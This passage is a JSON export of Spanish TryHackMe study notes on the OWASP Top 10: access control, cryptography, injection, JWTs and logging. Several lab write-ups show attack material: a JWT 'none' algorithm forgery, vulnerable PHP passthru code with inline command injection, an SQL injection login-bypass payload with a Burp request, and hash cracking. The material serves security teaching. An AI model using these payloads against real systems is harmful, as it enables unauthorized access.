    "content": "En esta unidad desglosaremos cada t√≥pico del OWASP y sus vulnerabilidades, c√≥mo ocurren y c√≥mo explotarlas. Podremos adem√°s la teor√≠a en pr√°ctica resolviendo desaf√≠os.\n\n1. Broken Access Control\n2. Cryptographic Failures\n3. Injection\n4. Insecure Design\n5. Security Misconfiguration\n6. Vulnerable and Outdated Components\n7. Identification and Authentication Failures\n8. Software and Data Integrity Failures\n9. Security Logging & Monitoring Failures\n10. Server-Side Request Forgery (SSRF)",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Broken Access Control (IDOR Challenge)",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/4-broken-access-control-idor-challenge/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/4. Broken Access Control (IDOR Challenge).md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "<h2>Referencia de Objeto Directo Insegura</h2>\n**IDOR** (Insecure Direct Object Reference), se refiere a la vulnerabilidad de access control donde puedes acceder a recursos que no deber√≠as de ver. Esto ocurre cuando el programador expone una referencia de objeto directo, que es un identificador que se refiere a objetos espec√≠ficos dentro del servidor. Por objeto podemos referirnos a un archivo, usuario, cuenta de banco o cualquier cosa.\n\nDigamos que estamos iniciando sesi√≥n en nuestra cuenta del banco, y despu√©s de autentificarnos correctamente, nos lleva a una URL como `https://bank.thm/account?id=111111`. En esa p√°gina podemos ver nuestros detalles sensibles.\n\nSi el sitio est√° configurado incorrectamente y alguien cambia el valor de id, ahora puede acceder a la cuenta de cada usuario.\n\nLa aplicaci√≥n expone un objeto de referencia a trav√©s del par√°metro `id` en la URL, que apunta a cuentas concretas. Ya que la aplicaci√≥n no est√° comprobando si el usuario logueado es propietario de la cuenta referenciada, un atacante puede conseguir informaci√≥n sensible gracias a una vulnerabilidad IDOR.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "20. Data Integrity Failure",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/20-data-integrity-failure/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/20. Data Integrity Failure.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "Pensemos en c√≥mo las aplicaciones web mantienen las sesiones. Usualmente, cuando un usuario inicia sesi√≥n en una aplicaci√≥n, se le dar√° un token que se debe guardar en el navegador hasta que la sesi√≥n expire. Estos pueden ser asignados de varias formas, pero normalmente vienen dados v√≠a cookies. Las **cookies** son pares llave-valor que el navegador guardar√° y que ser√° utilizado en las comunicaciones con el servidor autom√°tica y repetidamente.\n\nSi cre√°semos una aplicaci√≥n de email web, podr√≠amos asociar a cada usuario logueado una cookie con su nombre de usuario. De esta manera, en peticiones siguientes se mandar√≠a tu username en la cookie. Esto ser√≠a una idea terrible a nivel de ciberseguridad, porque si el usuario modifica el valor de la cookie, que se guarda en el navegador, podr√≠a obtener las cookies de sesi√≥n de otro usuario.\n\nUna soluci√≥n a esto es usar alg√∫n mecanismo de integridad para garantizar que la cookie no haya sido modificada. Para esto podr√≠amos usar un token que nos permita cumplir con los objetivos de criptograf√≠a y PoI (proof of integrity). Una de estas implementaciones es JWT (JSON Web Tokens).\n\nJWTs son tokens simples que te permiten guardar los pares llave-valor en un token que ofrece integridad como parte del token. La idea es que puedas generar tokens que puedas dar a tus usuarios con la certeza de que no ser√°n capaces de alterar los valores de parejas y pasar el check de integridad. La estructura de un JWT consta de 3 partes:\n\n![[Pasted image 20251013172339.png]]\n\nEl header contiene metadatos indicando que es un JWT, y el algoritmo de firmado que se utiliza es HS256. El payload contiene el par llave-valor con la informaci√≥n que la aplicaci√≥n web requiere al cliente guardar. La firma es similar a un hash, tomado para verificar la integridad del payload. Si cambias el payload, la firma no coincidir√° y la aplicaci√≥n web sabr√° que se ha modificado el payload.\n\n>[!NOTE] Cada una de las partes del JWT es texto plano encodeado en base64.\n\n------------------------\n<h2>JWT y el Algoritmo None</h2>\nUna vulnerabilidad de fallo de integridad estuvo presente en algunas librer√≠as que implementaban JWT hace un tiempo. Estas librer√≠as permitieron a los atacantes bypassear la validaci√≥n de firma cambiando las dos cosas siguientes en JWT:\n\n1. Modificar el header del token para que el header `alg` contuviese el valor `none`.\n2. Eliminar la parte de la firma.\n\nTomando como ejemplo el JWT que hemos visto antes, si quisi√©semos cambiar el payload para que el nombre de usuario fuese \"admin\" y que no se hiciera la comprobaci√≥n de integridad, tendr√≠amos que decodear, modificar y volver a codificar el header y payload.\n\n![[Pasted image 20251013191114.png]]\n\n----------------------\n<h2>Challenge</h2>\n1. Entramos en la p√°gina dada:\n   ![[Pasted image 20251013222434.png]]\n2. Probando suerte con \"guest\" \"guest\" entramos a dicho usuario:\n   ![[Pasted image 20251013222538.png]]\n3. Si abrimos las dev tools podemos ver la cookie de sesi√≥n que se nos ha asignado:\n   ![[Pasted image 20251013222753.png]]\n4. Si decodeamos nuestro token:\n   ![[Pasted image 20251013223103.png]]\n5. Entonces sabemos que modificando la primera y segunda parte y borrando la √∫ltima podemos acceder:\n   - Primero metemos el contenido decodeado en un archivo:\n     ![[Pasted image 20251013223552.png]]\n   - Ahora los modificamos:\n     ![[Pasted image 20251013223733.png]]\n     ![[Pasted image 20251013223814.png]]\n   - Por √∫ltimo extraemos los fragmentos codificados en base64:\n     ![[Pasted image 20251013224004.png]]\n6. Por √∫ltimo juntamos los trozos y lo sustituimos por nuestra cookie (hay que ponerle el punto al final):\n   ![[Pasted image 20251013224804.png]]\n7. Obtenemos la flag:\n   ![[Pasted image 20251013224834.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. II. Cryptographic Failures",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/5-ii-cryptographic-failures/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/5. II. Cryptographic Failures.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "<h2>Fallos Criptogr√°ficos</h2>\nUn fallo criptogr√°fico se refiere a cualquier vulnerabilidad dada a ra√≠z del mal uso o la falta de uso de un algoritmo criptogr√°fico para proteger informaci√≥n sensible. Las aplicaciones web requieren de criptograf√≠a para ofrecer confidencialidad para sus usuarios en varios niveles.\n\nToma por ejemplo, una aplicaci√≥n segura de email:\n\n- Al acceder a tu cuenta de email, quieres asegurarte de que la comunicaci√≥n entre t√∫ y el servidor sea cifrada. De esa manera, ojos curiosos no deseados no podr√°n entender nada. Cuando ciframos informaci√≥n en el tr√°fico de red lo llamamos **encrypting data in transit**.\n- Ya que tus emails est√°n almacenados en alg√∫n servidor controlado por quien te ofrece el servicio, tambi√©n es deseable que √©l no pueda leer los emails de sus clientes. Es por esto que tambi√©n son encriptados en est√°tico, lo que se conoce como **encrypting data at rest**.\n\nLoa fallos criptogr√°ficos normalmente acaban divulgando informaci√≥n sensible en las aplicaciones web. Normalmente es informaci√≥n referente a usuarios, como nombre, tel√©fono, etc. Aunque tambi√©n podr√≠an ser m√°s t√©cnicas, como usuarios o contrase√±as.\n\nAprovecharse de estos fallos requiere el uso de t√©cnicas como el MITM, aprovechando la poca o nula encriptaci√≥n de los datos y pudiendo leerlos.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "10. III.I. Command Injection",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/10-iii-i-command-injection/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/10. III.I. Command Injection.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "<h2>Inyecci√≥n de Comandos</h2>\nLa inyecci√≥n de comandos ocurre cuando c√≥digo del lado del servidor, como PHP, en una aplicaci√≥n web, hace una llamada a una funci√≥n que interact√∫a con la consola directamente. Una de estas vulnerabilidades permite al atacante ejecutar comandos en el sistema host.\n\nUna vez que esto pasa, ya puede empezar con la fase de enumeraci√≥n y pivotar entre sistemas.\n\n------------------\n<h2>Ejemplo de C√≥digo</h2>\nConsideremos el siguiente escenario: MooCorp ha empezado a desarrollar una aplicaci√≥n basada en web para arte ASCII de vacas con texto personalizable. Buscando maneras de implementar su app, han encontrado el comando `cowsay` de Linux, que hace justo eso. As√≠ que en vez de programar una aplicaci√≥n web entera, usan c√≥digo simple para decirle a `cowsay` lo que tiene que hacer. Veamos el c√≥digo que han desarrollado:\n\n```php\n<?php\n    if (isset($_GET[\"mooing\"])) {\n        $mooing = $_GET[\"mooing\"];\n        $cow = 'default';\n\n        if(isset($_GET[\"cow\"]))\n            $cow = $_GET[\"cow\"];\n        \n        passthru(\"perl /usr/bin/cowsay -f $cow $mooing\");\n    }\n?>\n```\n\nEn t√©rminos simples, este c√≥digo hace lo siguiente:\n\n1. Comprueba si el par√°metro \"mooing\" est√° definido. Si lo est√°, la variable `$mooing` recibe el valor pasado por el par√°metro.\n2. Comprueba si el par√°metro \"cow\" est√° definido. Si lo est√°, la variable `$cow` toma lo que le haya sido pasado.\n3. El programa ejecuta la funci√≥n `passthru(\"perl /usr/bin/cowsay -f $cow $mooing);`. La funci√≥n `passthru`, ejecuta un comando en la consola del sistema operativo. Podemos ver que el comando est√° concatenando las variables. Ya que podemos manipular esas variables, podemos inyectar comandos usando trucos.\n   \n   ![[Pasted image 20251009223354.png]]\n\n----------------------\n<h2>Explotar Inyecci√≥n de Comandos</h2>\nAhora que sabemos c√≥mo funciona la aplicaci√≥n por dentro, nos aprovecharemos de una capacidad de bash llamada \"inline commands\".\n\nPara ejecutar comandos inline, s√≥lo necesitamos en el siguiente formato `$(nuestro_comando)`. Si bash detecta un comando inline, lo ejecutar√° primero y usar√° el resultado con el comando principal, por ejemplo:\n\n![[Pasted image 20251009223744.png]]\n\nAs√≠ que, volviendo a la app de cowsay, esto es lo que pasar√≠a si inyect√°semos comandos:\n\n![[Pasted image 20251009223818.png]]\n\nYa que la aplicaci√≥n acepta cualquier input por nuestra parte, podemos inyectar comandos inline, que ser√°n ejecutados y usados como par√°metro para cowsay. Algunos comandos que puedes probar:\n\n- whoami\n- id\n- ifconfig / ip addr / ip a\n- uname -a\n- ps -ef\n\n------------------------\n<h2>Challenge</h2>\n\n1. ![[Pasted image 20251009224220.png]]\n2. ![[Pasted image 20251009224355.png]]\n3. ![[Pasted image 20251009224843.png]]\n4. ![[Pasted image 20251009225230.png]]\n5. ![[Pasted image 20251009225549.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Cryptographic Failures (Supporting Material 2)",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/7-cryptographic-failures-supporting-material-2/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/7. Cryptographic Failures (Supporting Material 2).md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "Ya vimos c√≥mo mandar queries a una base de datos SQLite. Encontramos una colecci√≥n de contrase√±as en hash, una para cada usuario. En esta tarea cubriremos c√≥mo crackearlas.\n\nAunque kali ya tiene preinstaladas herramientas espec√≠ficas para este proceso, estas no est√°n en el scope de la lecci√≥n. Estaremos usando [crackstation](https://crackstation.net/). Este sitio web es impresionantemente bueno crackeando  contrase√±as, aunque para hashes m√°s complicados tendr√≠amos que usar herramientas dedicadas.\n\nSi tratamos de descifrar la contrase√±a de Joy Paulson, `5f4dcc3b5aa765d61d8327deb882cf99`, obtenemos:\n\n![[Pasted image 20251009210426.png]]\n\nVemos que el hash ha sido crackeado y la contrase√±a expuesta. Crackstation funciona con diccionarios inmensos, si la contrase√±a no est√° en esos diccionarios ser√° imposible descifrarla.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "21. IX. Security Logging and Monitoring Failures",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/21-ix-security-logging-and-monitoring-failures/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/21. IX. Security Logging and Monitoring Failures.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "Cuando las aplicaciones web son configuradas, cada acci√≥n hecha por el usuario deber√≠a ser registrada. Logging es importante porque, en caso de incidente, la actividad del atacante puede ser rastreada. Una vez rastreado, su impacto y riesgo puede ser valorado. Sin logs, no habr√≠a manera de decir qu√© acciones ha realizado un atacante. Los impactos m√°s significativos ser√≠an:\n\n- **Da√±o regulatorio:** Si un atacante gana acceso a informaci√≥n identificable de un usuario, los usuarios finales pueden sufrir de ello, y en consecuencia, los desarrolladores enfrentarse a multas o penas m√°s severas.\n- **Riesgo de ataques futuros:** La presencia de un atacante puede pasar desapercibida sin logging. Esto podr√≠a permitirle ganar persistencia.\n\nLa informaci√≥n contenida en logs deber√≠a incluir lo siguiente:\n\n- C√≥digos de estado HTTP.\n- Time Stamps (momentos de tiempo).\n- Nombres de Usuario.\n- Endpoints API/page locations.\n- Direcciones IP.\n\nEstos logs tienen algo de informaci√≥n sensible por lo que se requiere guardarlos de forma segura y que m√∫ltiples copias est√©n guardadas en diferentes localizaciones.\n\nComo debes haberte dado cuenta, el logging es m√°s importante despu√©s de que haya ocurrido un incidente o brecha. El escenario ideal es tener monitoreo para detectar cualquier actividad sospechosa con el objetivo de detener al atacante o reducir el impacto que pueda tener. Ejemplos comunes de actividad maliciosa incluyen:\n\n- M√∫ltiples intentos de acceso no autorizado para una acci√≥n en particular (usualmente autentificaci√≥n o acceso a recursos no autorizados).\n- Peticiones desde una IP an√≥mala (aunque tambi√©n puede dar falsos positivos).\n- Uso de herramientas automatizadas. Usando el valor de los headers User-Agent o la velocidad pueden ser indicativos de esto.\n- Payloads comunes, en aplicaciones web, es com√∫n para los atacantes usar los payloads conocidos.\n\nAunque s√≥lo detectar actividad sospechosa no es √∫til, hay que tener un plan de actuaci√≥n en concordancia a su nivel de impacto.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "9. III. Injection",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/9-iii-injection/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/9. III. Injection.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "Las debilidades de inyecci√≥n son muy comunes en las aplicaciones hoy en d√≠a. Estas ocurren porque la aplicaci√≥n interpreta el input controlado por el usuario como comandos o par√°metros. Este tipo de vulnerabilidad depende de la tecnolog√≠a que se use, algunos ejemplos son:\n\n- **Inyecci√≥n SQL:** Ocurre cuando el input del usuario se pasa a queries SQL sin sanitizaci√≥n. Esto podr√≠a permitir al atacante acceder a informaci√≥n sensible.\n- **Inyecci√≥n de comandos:** Ocurre cuando el input del usuario se pasa a comandos de sistema. Como resultado, el atacante puede ejecutar comandos a su antojo, pudiendo conseguir acceso a la m√°quina.\n\nLa defensa principal para prevenir este tipo de ataques es asegurarse de que el input controlado por el usuario no sea interpretado como queries o comandos. Hay varias maneras de hacer esto:\n\n- **Usando una lista blanca:** Cuando el input se manda al servidor, este se compara con una lista de aquellos inputs que se consideran seguros, y s√≥lo deja pasar los que hacen match.\n- **Filtrando el input:** Si el input contiene caracteres peligrosos, estos se eliminan antes de procesarse.\n\nLos caracteres o inputs peligrosos  son cualquier input que pueda cambiar c√≥mo la informaci√≥n se procesa. En vez de construir manualmente listas blancas o filtrar los inputs, existen varias librer√≠as que pueden realizar estas acciones por nosotros.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "11. IV. Insecure Design",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/11-iv-insecure-design/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/11. IV. Insecure Design.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "El dise√±o inseguro se refiere a las vulnerabilidades que son inherentes a la arquitectura de la aplicaci√≥n. No son vulnerabilidades por mala implementaci√≥n o configuraci√≥n, sino que la idea de la aplicaci√≥n o parte de ella tiene una debilidad desde el inicio. Algunas, otras veces, est√°n relacionadas con errores de los propios programadores (si por ejemplo uno a√±ade atajos como desactivar a la validaci√≥n OTP para ahorrar tiempo en el testeo de la app completa) y lo manda a producci√≥n sin corregirlo.\n\n---------------\n<h2>Reseteos de Contrase√±a Inseguros</h2>\nUn buen ejemplo de este tipo de vulnerabilidades ocurri√≥ en Instagram no hace mucho (2019). Instagram permit√≠a a los usuarios resetear su contrase√±a si se olvidaban de ella mand√°ndoles un c√≥digo de 6 d√≠gitos a su m√≥vil v√≠a SMS. La fuerza bruta para romper el c√≥digo no era v√°lida porque instagram ten√≠a bloqueo de intentos.\n\nUna persona encontr√≥ que ese l√≠mite s√≥lo limitaba si los intentos ven√≠an de la misma m√°quina. De esta forma el atacante pod√≠a orquestar varias IPs y probar 250 intentos por cada una. Para un c√≥digo de 6 d√≠gitos tienes un total de 1.000.000 de combinaciones (000000-999999), por lo que con tan solo 1.000.000/250 = 4.000 IPs, pod√≠as romperla el 100% de las veces.\n\nF√≠jate c√≥mo la vulnerabilidad est√° basada en la idea de que ning√∫n usuario podr√≠a usar miles de IPs para hacer peticiones concurrentes. La mejor manera de combatir este tipo de vulnerabilidades es realizar un modelaje de amenazas al inicio.\n\n-------------------\n<h2>Challenge</h2>\n1. Entramos a la p√°gina web proporcionada.\n   ![[Pasted image 20251010184923.png]]\n2. Probamos con \"joseph\", que es la cuenta en la que debemos meternos:\n   ![[Pasted image 20251010185218.png]]\n3. No hay tantos colores, as√≠ que probaremos con eso:\n   ![[Pasted image 20251010185346.png]]\n4. Acertamos con \"green\":\n   ![[Pasted image 20251010185419.png]]\n5. Iniciamos sesi√≥n:\n   ![[Pasted image 20251010185448.png]]\n6. Dentro encontramos la flag:\n   ![[Pasted image 20251010185536.png]]\n   ![[Pasted image 20251010185548.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Accessing Machines",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/2-accessing-machines/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/2. Accessing Machines.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "Algunas tareas requieren conectarse a una m√°quina virtual, para ello puedes usar la attack box o descargarte la OpenVPN de TryHackMe. Despu√©s de descargarla act√≠vala haciendo `sudo openvpn /ruta/a/.ovpn`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "18. VIII. Softwares and Data Integrity Failures",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/18-viii-softwares-and-data-integrity-failures/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/18. VIII. Softwares and Data Integrity Failures.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "<h2>¬øQu√© es la integridad?</h2>\nAl hablar de integridad, nos referimos a la capacidad que tenemos de certificar que una pieza de informaci√≥n se mantiene sin tocar. Por ejemplo, si te est√°s descargando el √∫ltimo instalador de una aplicaci√≥n, ¬øc√≥mo puedes estar seguro de que mientras la descargabas no fue modificada o daa√±ada accidental o intencionadamente?\n\nPara contrarestar este problema, usualmente ver√°s hashes mandados junto a los archivos para que puedas probar que es el mismo. Un hash es un n√∫mero obtenido de aplicar un algotitmo concreto a un archivo. Normalmente encontraras MD5, SHA1, SHA256, etc.\n\nTomaremos WinSCP como ejemplo. Si vamos al su [repositorio](https://sourceforge.net/projects/winscp/files/WinSCP/5.21.5/) de Sourceforge, veremos que para cada archivo hay algunos hashes publicados. Estos son pre-calculados por los creadores de WinSCP con el objetivo de que puedas saber si lo que has descargado se corresponde.\n\nSi descargamos el archivo ejecutable y lo hasheamos con los mismos algoritmos que aparecen publicados, veremos que efectivamente coinciden.\n\n-----------------------\n<h2>Fallos de Integridad de Informaci√≥n y Software</h2>\nEsta vulnerabilidad surge de c√≥digo o infraestructura que usa software o informaci√≥n sin ning√∫n tipo de comprobaci√≥n de integridad. Como no est√° siendo comprobado, un atacante podr√≠a modificar c√≥digo o software pasado a la aplicaci√≥n con consecuencias inesperadas. Hay dos tipos de vulnerabilidades en esta categor√≠a:\n\n- Fallos de Integridad de Software.\n- Fallos de Integridad de Informaci√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Cryptographic Failures Challenge",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/8-cryptographic-failures-challenge/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/8. Cryptographic Failures Challenge.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "1. Entramos en la p√°gina:\n   ![[Pasted image 20251009211533.png]]\n2. Investigando, hacemos click en \"log in\" y al inspeccionar la p√°gina:\n   ![[Pasted image 20251009211754.png]]\n3. Seguimos el enlace hasta el endpoint \"/assets\":\n   ![[Pasted image 20251009211849.png]]\n4. A simple vista podemos observar lo que parece una base de datos `webapp.db`. Si la abrimos con sqlite3 en consola, podemos observar cositas:\n   ![[Pasted image 20251009212522.png]]\n5. Haciendo uso de Crackstation crackeamos la contrase√±a:\n   ![[Pasted image 20251009212930.png]]\n6. Con el usuario y la contrase√±a en nuestro poder nos logueamos como admin:\n   ![[Pasted image 20251009213039.png]]\n7. As√≠ obtenemos la flag:\n   ![[Pasted image 20251009213110.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. OWASP Top 10 - 2021",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/0-owasp-top-10-2021/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/0. OWASP Top 10 - 2021.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/1. Introduction]]\n[[2. Accessing Machines]]\n[[3. I. Broken Access Control]]\n[[4. Broken Access Control (IDOR Challenge)]]\n[[5. II. Cryptographic Failures]]\n[[6. Cryptographic Failures (Supporting Material 1)]]\n[[7. Cryptographic Failures (Supporting Material 2)]]\n[[8. Cryptographic Failures Challenge]]\n[[9. III. Injection]]\n[[10. III.I. Command Injection]]\n[[11. IV. Insecure Design]]\n[[12. V. Security Misconfiguration]]\n[[13. VI. Vulnerable and Outdated Components]]\n[[14. Vulnerable and Outdated Components - Exploit]]\n[[15. Vulnerable and Outdated Components - Lab]]\n[[16. VII. Identification and Authentification Failures]]\n[[17. Identification and Authetification Failures Practical]]\n[[18. VIII. Softwares and Data Integrity Failures]]\n[[19. Software Integrity Failure]][[20. Data Integrity Failure]]\n[[20. Data Integrity Failure]]\n[[21. IX. Security Logging and Monitoring Failures]]\n[[22. X. Server-Side Request Forgery (SSRF)]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Cryptographic Failures (Supporting Material 1)",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/6-cryptographic-failures-supporting-material-1/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/6. Cryptographic Failures (Supporting Material 1).md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "La forma m√°s com√∫n de guardar una cantidad grande de informaci√≥n en un formato f√°cilmente accesible desde varios sitios es una base de datos. Los sitios web usualmente siguen SQL.\n\nEn un entorno de producci√≥n, es com√∫n ver bases de datos configuradas en servidores dedicados. Sin embargo, las bases de datos tambi√©n se pueden guardar como archivos. A estas se les llama bases de datos \"flat-files\". Es mucho m√°s sencillo que configurar una base de datos (aunque a gran escala tambi√©n es mucho mas complicado de acceder a los datos).\n\nComo ya hemos dicho estos flat-files est√°n guardados en directorios. Esto no ser√≠a un problema pero ¬øqu√© pasa si la base de datos est√° guardada bajo el directorio root? Podr√≠amos hacer queries a nuestra propia m√°quina, filtrando archivos potencialmente sensibles.\n\nVamos con el ejemplo, usaremos `sql3`. Supongamos que hemos sido capaces de descargarnos la base de datos:\n\n```bash\nuser@linux$ ls -l \n-rw-r--r-- 1 user user 8192 Feb  2 20:33 example.db\n                                                                                                                                                              \nuser@linux$ file example.db \nexample.db: SQLite 3.x database, last written using SQLite version 3039002, file counter 1, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 1\n```\n\nPodemos ver que hay un archivo SQLite. Para acceder a √©l usamos `sqlite3 <database_name>`.\n\n```bash\nuser@linux$ sqlite3 example.db                     \nSQLite version 3.39.2 2022-07-21 15:24:47\nEnter \".help\" for usage hints.\nsqlite> \n```\n\nAhora podemos usar las tablas usando el comando `.tables`:\n\n```sqlite\nsqlite> .tables\ncustomers\n```\n\nAhora podemos dumpear todo el contenido de las tablas. Aunque todav√≠a no sabemos lo que significa cada columna hasta que miremos la informaci√≥n de la tabla, usemos pues, primero, `PRAGMA table_info(customers);` para ver la informaci√≥n de la tabla. Despu√©s usamos `SELECT * FROM customers;` para obtener la informaci√≥n guardada en la tabla.\n\n```sqlite\nqlite> PRAGMA table_info(customers);\n0|cudtID|INT|1||1\n1|custName|TEXT|1||0\n2|creditCard|TEXT|0||0\n3|password|TEXT|1||0\n\nsqlite> SELECT * FROM customers;\n0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99\n1|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a\n2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b19\n3|Andrew Miller|4059 8824 0198 5596|bc7b657bd56e4386e3397ca86e378f70\n4|Keith Wayman|4972 1604 3381 8885|12e7a36c0710571b3d827992f4cfe679\n5|Annett Scholz|5400 1617 6508 1166|e2795fc96af3f4d6288906a90a52a47f\n```\n\nPodemos ver que hay cuatro columnas, `custID`, `custName`, `creditCard` y `password`. Podemos ver que adem√°s concuerda con los resultados.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "15. Vulnerable and Outdated Components - Lab",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/15-vulnerable-and-outdated-components-lab/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/15. Vulnerable and Outdated Components - Lab.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "1. Navegamos a la p√°gina dada.\n   ![[Pasted image 20251011134021.png]]\n2. Buscamos por aplicaciones de tienda de libros (bookstore application):\n   ![[Pasted image 20251011134917.png]]\n3. El c√≥digo que encontramos tiene ejemplo tanto por web como usando Burp Suite:\n   ```bash\n# Exploit Title: CSE Bookstore Authentication Bypass\n# Date: 27/10/2020\n# Exploit Author: Alper Basaran\n# Vendor Homepage: https://projectworlds.in/\n# Software Link: https://github.com/projectworlds32/online-book-store-project-in-php/archive/master.zip\n# Version: 1.0\n# Tested on: Windows 10 Enterprise 1909\n\n\nCSE Bookstore is vulnerable to an authentication bypass vulnerability on the admin panel. \nBy default the admin panel is located at /admin.php and the administrator interface can be accessed by unauthorized users exploiting the SQL injection vulnerability.\n\nPayload: \nName: admin\nPass: %' or '1'='1 \n\nSample BurpSuite intercept:\n\nPOST /bookstore/admin_verify.php HTTP/1.1\nHost: 192.168.20.131\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 60\nOrigin: http://192.168.20.131\nConnection: close\nReferer: http://192.168.20.131/bookstore/admin.php\nCookie: PHPSESSID=hmqnib0ihkvo235jor7mpfoupv\nUpgrade-Insecure-Requests: 1\n\nname=admin&pass=%25%27+or+%271%27%3D%271&submit=Submit+Query\n```\n\n4. Probamos:\n   ![[Pasted image 